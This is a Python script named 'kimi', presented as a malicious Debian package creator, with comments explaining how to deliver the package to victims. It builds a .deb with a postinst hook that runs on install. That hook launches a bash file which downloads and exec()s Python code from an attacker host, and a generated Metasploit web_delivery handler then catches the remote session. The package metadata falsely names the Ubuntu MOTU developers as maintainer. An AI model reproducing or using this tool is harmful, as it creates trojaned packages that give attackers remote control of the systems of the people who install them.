#!/usr/bin/env python

#   ____  __. .__             .__  
#  |    |/ _| |__|   _____    |__| 
#  |      <   |  |  /      \  |  | 
#  |    |  \  |  | |  Y Y   \ |  | 
#  |____|__ \ |__| |__|_|   / |__| 
#          \/            \./Suspicious Shell Activity     
#          Malicious Debain Package Creator
#          Coded by Chaitanya Haritash
#          Twitter :: @bofheaded


##
# Information :::
# kimi - Malicious Debian Package generator
# Script to generate malicious debian packages (unix systems)
# "Kimi is the name inspired from 'Kimimaro' one of my favorite charaters from anime 'Naruto'"
#
#    Kimi is a script which generates Malicious debian packages for metasploit
#    which consists of a bash file with one python call. The bash file is deployed
#    into "/usr/local/bin" directory. The Bash file injected acts like a 'trigger'
#    of msf web_delivery module that delivers a python payload to target and when
#    executed by victim the attacker will get is session open in return.
#
#    Kimi basically depends upon web_delivery module and everything is automated. 
#    All the attacker needs to do is to send the debian agent to target and start
#    the comrrespondent handler(web_delivery) 'sudo msfconsole -r handler.rc'
#
#    Plus Points ::
#    -- Fully indiependent. Means user no need to install any debian package creator
#    -- Can be integrated with any payload generator easily due to engagements of argument's
#
#
# GENERATING MALICIOUS PAYLOAD ::
#     dreamer@mindless ~$ sudo python kimi.py -n name -l 127.0.0.1 -V 1.0
#
# EXECUTING METASPLOIT HANDLER ::
#     dreamer@mindless ~$ sudo msfconsole -r handler.rc
#
# EXECUTING .DEB ON TARGET ::
#     dreamer@mindless ~$ sudo dpkg -i <package_name.deb>
#
#
# TESTED ON ::
#    Linux Mint 17.2 Cinnamon (Ubuntu 14.04) 
#    ParrotOS (Debian Jessie)
#    Kali rolling (2.0) 
#
#    NOTE :: This project was made to be integrated in Venom Shellcode Generator 1.0.13
#    But it can be used as an standalone program also.
#    Thanks r00t 3xpl0it for all corrections and ideas :) <3
##


#
# dependencies
#
import os,time
import argparse,sys


#
# script colors
#
BOLD = '\033[1m'
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[32m'
WHITE  = '\033[0m'  
ORANGE  = '\033[33m'


#
# script banner
#
def printer():
     global banner
     banner = """
    ____  __. .__             .__  
   |    |/ _| |__|   _____    |__| 
   |      <   |  |  /      \  |  | 
   |    |  \  |  | |  Y Y   \ |  | 
   |____|__ \ |__| |__|_|   / |__| Ver.1.1
           \/            \./Suspicious Shell Activity     
           Malicious Debain Package Creator
           Coded by Chaitanya Haritash
           Twitter :: @bofheaded

  """


#
# parse arguments funtion
#
def main():
  try:
    print banner
    parser = argparse.ArgumentParser()
    parser.add_argument('-n','--name', help="Name for your package" , required="true")
    parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
    parser.add_argument('-V','--vers', help="Version for package" , required="true")
    global go
    go = parser.parse_args()
    global h
    global j
    global we
    h = str(go.name)
    j = str(go.name)+"_"+str(go.vers)
    we = str(go.lhost) 
    #
    # Build bash template (.sh) with python call (python -c)
    # The string will trigger web_delivery python agent deploy ..
    #
    with open(h, "w+") as r:  
      payload = """
#!/bin/bash
python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"  

          """
      k = r.write(payload)
      #
      # Build postinst file to trigger payload execution
      #
      o = open("postinst" , "a")
      m = """

#!/bin/bash

chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" & 

      """
      o.write(m)
      o.close()
      os.system("chmod 0755 postinst")
  except IOError:
    print banner
    print "[-] please provide valid arguments [-]"
    print ""


#
# Build debian malicious file main funtion
#
def make_deb(): 
  gen = """
#!/bin/sh
chmod u+x """+h+"""
cat >> control << EOF

Package: """+str(go.name)+"""
Version: """+str(go.vers)+"""
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: MDPC kimi (SSA-RedTeam development 2017)

EOF

mkdir -p """+j+"""/usr/local/bin
cp """+h+""" """+j+"""/usr/local/bin
sleep 2
mkdir -p """+j+"""/DEBIAN
cp control """+j+"""/DEBIAN/control
cp postinst """+j+"""/DEBIAN/postinst
sleep 3
dpkg-deb --build """+j+"""
sleep 5
rm -rf """+h+"""
rm -rf control
rm -rf postinst
rm -rf """+j+"""
rm -rf fro.sh

  """
  er = open("fro.sh" , "w")
  er.write(gen)
  er.close()
  #
  # chmod all files needed
  #
  os.system("chmod +x fro.sh")
  os.system("./fro.sh")
  os.system("sudo chmod 777 *.deb")


#
# Build handler resource file
# to automate web_delivery handler
#
def make_resource():
 
    res = """
use exploit/multi/script/web_delivery
set SRVHOST """+we+"""
set LHOST """+we+"""
set URIPATH /SecPatch
exploit
    """
    b = open("handler.rc" , "w")
    b.write(res)
    b.close()
    time.sleep(1)
    print BOLD+"execute handler:"+WHITE+" sudo msfconsole -r handler.rc"

#
# No need to auto-execute handler (venom will take care of that)
#    os.system('xterm -e "sudo msfconsole -r handler.rc"')  
#

if __name__ == '__main__':
  printer()
  main()
  make_deb()
  make_resource()

